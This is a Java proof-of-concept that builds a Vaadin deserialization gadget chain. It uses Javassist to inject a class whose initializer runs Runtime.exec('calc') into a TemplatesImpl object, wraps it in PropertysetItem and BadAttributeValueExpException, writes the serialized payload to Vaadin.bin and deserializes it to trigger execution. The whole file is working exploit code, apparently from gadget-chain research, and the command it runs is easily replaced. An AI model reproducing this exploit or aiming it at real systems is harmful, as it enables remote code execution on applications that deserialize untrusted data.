package Vaadin;

/**
 * BadAttributeValueExpException.readObject()
 *     PropertysetItem.toString()
 *             PropertysetItem.getPropertyId()
 *                 NestedMethodProperty.getValue()
 *                     TemplatesImpl.getObjectPropertyValue()
 */

import Tools.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class Vaadin {
    public static String fileName = "Vaadin.bin";
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        SerializeUtil.setFieldValue(templates, "_bytecodes", targetByteCodes);
        SerializeUtil.setFieldValue(templates, "_name", "name");
        SerializeUtil.setFieldValue(templates, "_class", null);

        PropertysetItem pItem = new PropertysetItem();
        //触发getoutputProperties方法
        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(templates, "outputProperties");
        pItem.addItemProperty("1", nmprop);
        // 实例化 BadAttributeValueExpException 并反射写入
        BadAttributeValueExpException exception = new BadAttributeValueExpException("");
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, pItem);

        SerializeUtil.writeObjectToFile(exception,fileName);
        SerializeUtil.readFileObject(fileName);
    }
}
